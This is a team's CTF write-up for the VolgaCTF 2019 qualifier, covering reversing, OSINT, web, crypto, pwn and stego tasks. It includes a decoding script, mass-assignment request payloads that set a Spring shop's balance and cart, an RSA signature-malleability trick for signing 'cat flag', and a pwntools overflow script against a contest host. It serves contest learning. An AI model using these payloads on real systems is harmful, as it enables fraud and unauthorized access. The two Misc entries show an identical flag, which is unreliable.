# VolgaCTF 2019 Qualifier

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190329-volgactfqual/) of this writeup.**


 - [VolgaCTF 2019 Qualifier](#volgactf-2019-qualifier)
   - [Reverse](#reverse)
     - [PyTFM](#pytfm)
     - [Jac2](#jac2)
   - [antifake](#antifake)
     - [Horrible retelling](#horrible-retelling)
     - [Fakegram star](#fakegram-star)
   - [Web](#web)
     - [Shop](#shop)
     - [Shop V2](#shop-v2)
   - [Crypto](#crypto)
     - [Beard Party](#beard-party)
     - [blind](#blind)
       - [Concept](#concept)
       - [solution](#solution)
     - [shifter](#shifter)
       - [Concept](#concept-1)
       - [Solution](#solution-1)
     - [Pwn](#pwn)
       - [Warm](#warm)
   - [Misc](#misc)
     - [JOI](#joi)
     - [Higher](#higher)


## Reverse
### PyTFM
It's a python extension.
It use a lot SSE instructions when calculating the output.
IDA doesn't decompile those SSE instructions, so I decided to reverse dynamically.
The output looks like:

```
00000000008c9940 0000000000000000
2568e69da46159c0 b46da5e5efdc43c0
654018b0da1854c0 74717816b37052c0
189342d067b948c0 b1b631bae75f58c0
fcffffffffff2fc0 0000000000405bc0
76b339f91d7e30c0 299e0187fb335fc0
674018b0da185840 e4e2f02c66e14cc0
921e5604e0dd5940 a13c457f178541c0
0000000000405b40 0000000000000000
911e5604e0dd5940 a83c457f17854140
654018b0da185840 e8e2f02c66e14c40
84b339f91d7e30c0 2b9e0187fb335f40
02000000000030c0 0000000000405b40
1d9342d067b948c0 afb631bae75f5840
674018b0da1854c0 72717816b3705240
2668e69da46159c0 af6da5e5efdc4340
```
The `c0` and `40` suffixs look like double floating numbers.

There's some interesting property of the output:

```
A = transform('\0\0...A\0...\0\0')
B = transform('\0\0...\0B...\0\0')
C = transform('\0\0...AB...\0\0')
A + B == C
```
At this point, I try to use genetic algorithm to search a flag since it is not a strong cipher.
It says that the flag looks like `VolgaCTF{XXX_1s_........_......}`, but it is not accurate enough to find the flag.

Then I go back to look at the output, trying to figure out what it is.
The program calls a imported funtion `cexp` -- exponential of complex number.
So I group every two numbers:

```
Output of '\0\0a\0...'
[ 9.70000000e+01,  0.00000000e+00]
[ 6.85893578e+01, -6.85893578e+01]
[ 5.93953698e-15, -9.70000000e+01]
[-6.85893578e+01, -6.85893578e+01]

[-9.70000000e+01,  0.00000000e+00]
[-6.85893578e+01,  6.85893578e+01]
[-5.93953698e-15,  9.70000000e+01]
[ 6.85893578e+01,  6.85893578e+01]

[ 9.70000000e+01,  0.00000000e+00]
[ 6.85893578e+01, -6.85893578e+01]
[ 5.93953698e-15, -9.70000000e+01]
[-6.85893578e+01, -6.85893578e+01]

[-9.70000000e+01,  0.00000000e+00]
[-6.85893578e+01,  6.85893578e+01]
[-5.93953698e-15,  9.70000000e+01]
[ 6.85893578e+01,  6.85893578e+01]

Output of '\0\0\0\0a\0...'
[ 9.70000000e+01,  0.00000000e+00]
[ 5.93953698e-15, -9.70000000e+01]

[-9.70000000e+01,  0.00000000e+00]
[-5.93953698e-15,  9.70000000e+01]

[ 9.70000000e+01,  0.00000000e+00]
[ 5.93953698e-15, -9.70000000e+01]

[-9.70000000e+01,  0.00000000e+00]
[-5.93953698e-15,  9.70000000e+01]

[ 9.70000000e+01,  0.00000000e+00]
[ 5.93953698e-15, -9.70000000e+01]

[-9.70000000e+01,  0.00000000e+00]
[-5.93953698e-15,  9.70000000e+01]

[ 9.70000000e+01,  0.00000000e+00]
[ 5.93953698e-15, -9.70000000e+01]

[-9.70000000e+01,  0.00000000e+00]
[-5.93953698e-15,  9.70000000e+01]
```
It looks like a sinusoid where the amplitude is the charcode,
and the frequency is the position of that char.
Running FFT on the output will recover the flag.

### Jac2
* Patch anti-debug at `sub_401794`:

```c
__int64 sub_401794()
{
  if ( getenv("LD_PRELOAD") != 0LL )
    exit(0);
  if ( ptrace(0, 0LL, 0LL, 0LL) < 0 )
    exit(0);
  return (unsigned int)(dword_6033A4++ + 1);
}
```
* Reverse it and implement decoding:

```python
#!/usr/bin/env python
from pwn import *
from ctypes import *
import re

# VolgaCTF{ptr@ce_ant1_r3verse_@ll_in_va1n}

def rol( n , c ):
    c %= 32
    n &= 0xffffffff
    r = ( ( n << c ) & 0xffffffff ) + ( n >> ( 32 - c ) )
    return c_int( r ).value

def ror( n , c ):
    c %= 32
    n &= 0xffffffff
    r = ( n >> c ) + ( ( n << ( 32 - c ) ) & 0xffffffff )
    return c_int( r ).value


t = [0x04, 0x08, 0x15, 0x16, 0x23, 0x42, 0xA0, 0x15, 0x33, 0x97, 0x57, 0x1D, 0x7F, 0x45, 0x9C, 0x25 , 0x0]
r = [0] * 26
s = []

def func2( _a , _b ):
    global r
    a = s[ _a ]
    b = s[ _b ]
    n = r[0] + a
    m = r[1] + b

    for i in range( 1 , 12 + 1 ):
        n = rol( m ^ n , m & 0x1f ) + r[ 2 * i ]
        m = rol( n ^ m , n & 0x1f ) + r[ 2 * i + 1 ]
  
    s[_a] = n
    s[_b] = m


def de_func2( _a , _b ):
    global r
    n = s[_a]
    m = s[_b]

    for i in range( 12 , 0 , -1 ):
        m = ror( m - r[ 2 * i + 1 ] , n & 0x1f ) ^ n
        n = ror( n - r[ 2 * i ] , m & 0x1f ) ^ m

    s[_a] = c_int( n - r[0] ).value
    s[_b] = c_int( m - r[1] ).value


def encode():
    global t , r , s
    ptr = [0] * 4
    a = 4
    b = 4
    buf = [0] * 4

    ptr = [ 0x8faea09e , 0x60b671a , 0x606fe6cc , 0x30bb606b ]

    r[0] = c_int( 0xB7E15163 ).value

    for i in range( 1 , 26 ):
        r[i] = c_int( r[ i - 1 ] - 0x61C88647 ).value


    j , i , p , q , n = 0 , 0 , 0 , 0 , 26
    m = max( n , b )

    for k in range( 1 , 3 * m + 1 ):
        r[i] = rol( c_int( q + r[i] + p ).value , 3 )
        q = r[i]
        i = ( i + 1 ) % n

        ptr[j] = rol( c_int( q + ptr[j] + p ).value , c_int( q + p ).value & 0x1f )
        p = ptr[j]
        j = ( j + 1 ) % b

    for i in range( ( len( s ) + 7 ) >> 3 ):
        func2( 2 * i , 2 * i + 1 )



s = 'yuawn777'
s = [ u32( _ ) for _ in re.findall( '....' , s ) ]
encode()

# decode
s = open( './data.jac2' ).read()
s = [ u32( _ ) for _ in re.findall( '....' , s ) ]

for i in range( len(s) >> 1 ):
    de_func2( 2 * i , 2 * i + 1 )

flag = ''.join( p32( _ ) for _ in s ).strip('\0')
print flag
```

## antifake

### Horrible retelling


```
Scientists found the oldest telescope This tool was used by seafarers from Portuge. British researchers report that scientists explore Arabian sea bottom. There are a lot of wrecks. Last week one of the Scientist journal published an article about discovering a special device. It’s looks like big coin with a hole in its centre. Historians classed it as an oldest device of its tipe. Researchers suggest that it was used in middle ages or mayby earlier. One of the most special detail of telescope is a pattern rounds telescope. It includes a Picture of the Earth. At the turn of the Middle ages that was associated with a Portuguese king. There is only one same devise has been fond before. But researchers don’t sure about age of it. Altogether there are more tahn hundred same artifacts. New one isn’t most old. But its’s unique with its decoration. Besides in the latest Middle ages navigator sed more precise devices
```

Just paste it in google search, and you'll find a website：
[https://www.ancient-origins.net/news-history-archaeology/oldest-astrolabe-0011641](https://www.ancient-origins.net/news-history-archaeology/oldest-astrolabe-0011641)

Then you realize the paragraph is talking about `astrolabe` not `telescope`.

`VolgaCTF{astrolabe}`

### Fakegram star

Find out difference between the fake news and origin news.


```
-   theflag  
    [https://www.instagram.com/p/BvmItadA1Fw/](https://www.instagram.com/p/BvmItadA1Fw/)  
    [https://www.instagram.com/p/BveGz6Sl8A3/](https://www.instagram.com/p/BveGz6Sl8A3/)
    
-   is  
    [https://www.instagram.com/p/BvmIKXDAVr8/](https://www.instagram.com/p/BvmIKXDAVr8/)  
    [https://www.instagram.com/p/BvJex34Fe8Z/](https://www.instagram.com/p/BvJex34Fe8Z/)
    
-   we  
    [https://www.instagram.com/p/BvmIFrdAdpK/](https://www.instagram.com/p/BvmIFrdAdpK/)  
    [https://www.instagram.com/p/BvQ8FRklkAK/](https://www.instagram.com/p/BvQ8FRklkAK/)
    
-   ask  
    [https://www.instagram.com/p/BupDX8tn4DK/](https://www.instagram.com/p/BupDX8tn4DK/)  
    [https://www.instagram.com/p/BvmAIqXgZjw/](https://www.instagram.com/p/BvmAIqXgZjw/)
    
-   you  
    [https://www.instagram.com/p/ButbLhdlMXx/](https://www.instagram.com/p/ButbLhdlMXx/)  
    [https://www.instagram.com/p/BvlyqodgZvm/](https://www.instagram.com/p/BvlyqodgZvm/)
    
-   to  
    [https://www.instagram.com/p/BtvbtumnZ2c/](https://www.instagram.com/p/BtvbtumnZ2c/)  
    [https://www.instagram.com/p/BvlyelLgTFJ/](https://www.instagram.com/p/BvlyelLgTFJ/)
    
-   make  
    [https://www.instagram.com/p/Buq5w04FBPh/](https://www.instagram.com/p/Buq5w04FBPh/)  
    [https://www.instagram.com/p/BvlxYTqAOku/](https://www.instagram.com/p/BvlxYTqAOku/)
    
-   writeup  
    [https://www.instagram.com/p/Bu6X0OTnVQ5/](https://www.instagram.com/p/Bu6X0OTnVQ5/)  
    [https://www.instagram.com/p/BvlxAJyASSu/](https://www.instagram.com/p/BvlxAJyASSu/)
    
-   for  
    [https://www.instagram.com/p/BvgpwcNBN7P/](https://www.instagram.com/p/BvgpwcNBN7P/)  
    [https://www.instagram.com/p/BvlwIjZA-Ws/](https://www.instagram.com/p/BvlwIjZA-Ws/)
    
-   this  
    [https://www.instagram.com/p/BvgYaxchRzP/](https://www.instagram.com/p/BvgYaxchRzP/)  
    [https://www.instagram.com/p/BvlwEm0gcOH/](https://www.instagram.com/p/BvlwEm0gcOH/)
    
-   task  
    [https://www.instagram.com/p/BuWzZ_1Hpmp/](https://www.instagram.com/p/BuWzZ_1Hpmp/)  
    [https://www.instagram.com/p/BvkE3MRAMUU/](https://www.instagram.com/p/BvkE3MRAMUU/)

```

`VolgaCTF{theflagisaskyoutomakewriteupforthistask}`


## Web

### Shop

The challenge was putting the flag in the database.
We have to use `1337` dollars to buy the flag.
But the default mount was 100 dollars, we don;t have enough money. 

`/robots.txt` give us a backup file `shop-1.0.0.war`

Download and decompile it with JD-GUI or other tools you prefer.
After reading the source code, we notice the vulnerability is `mass assignment`

reference about `mass assignment`:https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md

And we reference this blog about `Spring MVC, Protect Yourself From Mass Assignment`: [https://domineospring.wordpress.com/2015/05/18/spring-mvc-proteja-se-do-mass-assignment/](https://domineospring.wordpress.com/2015/05/18/spring-mvc-proteja-se-do-mass-assignment/)


```=java=1
@Entity
public class User
implements Serializable {
    @Id
    @GeneratedValue(strategy=GenerationType.IDENTITY)
    private Integer id;
    private String name;
    private String pass;
    private Integer balance;
    @ManyToMany(targetEntity=Product.class, cascade={CascadeType.PERSIST, CascadeType.REFRESH})
    private List<Product> cart;

    public User() {
    }

    public User(String name, String pass, Integer balance) {
        this.name = name;
        this.pass = pass;
        this.balance = balance;
    }
```

We can easily modify `name`、`pass` and `balance`.

`shop.q.2019.volgactf.ru/profile?name=wow! such mass assignment!&Balance=123123`

![](https://i.imgur.com/GatBb2N.png)

Let's focus on `/buy` Request

```=java=1

@RequestMapping(value={"/buy"})
    public String buy(@RequestParam Integer productId, @ModelAttribute(value="user") User user, RedirectAttributes redir, HttpServletRequest request) {
        HttpSession session = request.getSession();
        if (session.getAttribute("user_id") == null) {
            return "redirect:index";
        }
        Product product = this.productDao.geProduct(productId);
        if (product == null) {
            redir.addFlashAttribute("message", (Object)"Product not found");
            return "redirect:index";
        }
        if (product.getPrice() > user.getBalance()) {
            redir.addFlashAttribute("message", (Object)"Not enough money");
            return "redirect:index";
        }
        user.setBalance(Integer.valueOf(user.getBalance() - product.getPrice()));
        user.getCartItems().add(product);
        this.userDao.update(user);
        redir.addFlashAttribute("message", (Object)"Successful purchase");
        return "redirect:profile";
    }
    
```
 
Because we can easily control the `Balance`, this challenge can easy exploit by using `/buy` request.


```
POST /buy HTTP/1.1  

......

productId=4&Balance=123456

```

`VolgaCTF{c6bc0c68f0d0dac189aa9031f8607dba}`

### Shop V2

The challenge's vulnerability is same as the v1.
But we cannot use `/buy` request anymore.


```=java=1
    @RequestMapping(value={"/buy"})
    public String buy(@RequestParam Integer productId, @ModelAttribute(value="user") User user, RedirectAttributes redir, HttpServletRequest request) {
        HttpSession session = request.getSession();
        if (session.getAttribute("user_id") == null) {
            return "redirect:index";
        }
        redir.addFlashAttribute("message", (Object)"Too easy");
        return "redirect:index";
```

But there's a interesting things in `/profile`


```=java=1
    @RequestMapping(value={"/profile"})
    public String profile(@ModelAttribute(value="user") User user, Model templateModel, HttpServletRequest request) {
        HttpSession session = request.getSession();
        if (session.getAttribute("user_id") == null) {
            return "redirect:index";
        }
        ArrayList cart = new ArrayList();
        user.getCartItems().forEach(p -> cart.add(this.productDao.geProduct(p.getId())));
        templateModel.addAttribute("cart", cart);
        return "profile";

```

Let's give it a test!


```
POST /profile HTTP/1.1  

......

cart[0].id=4

```
Nothing happened :(

After trace the getter and setter, we notice that the real name isn't `cart` but `CartItems`.


```=java=1
    public List<Product> getCartItems() {
        return this.cart;
    }

    public void setCartItems(List<Product> cart) {
        this.cart = cart;
    }

```

Let's exploit again with `CartItems`


```
POST /profile HTTP/1.1  

......

CartItems[0].id=4

```

Then you'll see the flag in your profile.

`VolgaCTF{e86007271413cc1ac563c6eca0e12b62}`

## Crypto
### Beard Party
Coding challenge :D  
Google the value of Sbox, you'll find a paper of [Partition-based Trapdoor Ciphers](https://www.intechopen.com/books/partition-based-trapdoor-ciphers/partition-based-trapdoor-ciphers).
Implement the algorithm to recover the secret key.
Note:
1. I can only find a picture of secret G's table, so I wrote a OCR using SVM to convert it to numbers.
2. `u in t + V` implies `u + t in V`. Build a 1024 elements array for the existence of V, and check whether `u + t` is inside `V` would be much faster.
3. In filtering stage, maintain an array of valid plain/cipher pair's indices instead of looping through all the pairs again.
4. Generate all `2^15 * 1024` scores in parallel, than sort the scores at once instead of using priority queue.

### blind
#### Concept
This is a chal related to digital signature. we can do the following (I omit some useless things)
1. sign a command
2. call `ls` or `cat` after authentication

`cat` is black-listed command that forbid us to sign. However the way it check the black list is `Base64Decode(input) == 'cat'`, and it is easy to bypass.
#### solution
First use `ls` command and we can see that flag is stored in `flag`.
Then we can simply convert `cat flag` into integer and factor it into `a` * `b`. Since RSA is malleable, `sign(a * b) == (sign(a) * sign(b)) % n`, we can then get flag.

### shifter
#### Concept
This is a classic LFSR problem..., except that we don't have a good way to reduce the number of possible sequences generated by the LFSR.
#### Solution
thank god we have a crpyto king! 
@sasdf immediately post the solution and keep struggling with `Beard Party`.
https://en.wikipedia.org/wiki/Berlekamp%E2%80%93Massey_algorithm
https://github.com/dqi/ctf_writeup/tree/master/2017/volgaquals/casino
the register length is 16, so we can simply bruteforce all possible start states. Also we can try to guess the start sequence in `flag.html` -- it is `<!DOCTYPE HTML>`.
### Pwn
#### Warm
Guessing.....

```python

#!/usr/bin/env python
from pwn import *
import string , itertools

# VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}

host , port = 'warm.q.2019.volgactf.ru' , 443
y = remote( host , port )

pwd = 'v8&3mqPQebWFqM?x'
f = '/opt/warm/flag' # Seek file with something more sacred!
f = '/opt/warm/sacred'

y.sendlineafter( 'password!\n' , pwd.ljust( 0x64 , '\0' ) + f )

y.interactive()
```

## Misc
### JOI
Qrcode at red 0:
![](https://i.imgur.com/EaQny8m.png)
* VolgaCTF{5t3g0_m4tr3shk4_in_4cti0n}
### Higher
Frequency: 15K ~ 20K:
![](https://i.imgur.com/JjbGDgi.jpg)
* VolgaCTF{5t3g0_m4tr3shk4_in_4cti0n}
